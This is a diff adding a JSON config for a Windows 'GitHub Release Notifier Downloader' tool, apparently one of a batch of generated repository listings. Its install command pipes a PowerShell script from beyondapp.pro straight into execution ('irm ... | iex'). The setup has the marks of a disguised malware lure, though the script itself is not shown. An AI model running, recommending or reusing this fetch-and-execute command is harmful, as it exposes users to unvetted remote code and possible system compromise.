@@ -1,0 +1,22 @@
+{
+  "repo": "GitHub-Release-Notifier-Downloader",
+  "product": "GitHub Release Notifier Downloader",
+  "kind": "dev-tool",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30",
+  "format": "license-md-only",
+  "category": "dev",
+  "topics": [
+    "github-release-notifier-downloader",
+    "github",
+    "release",
+    "notifier",
+    "downloader",
+    "developer-tools",
+    "automation",
+    "cli",
+    "windows"
+  ]
+}
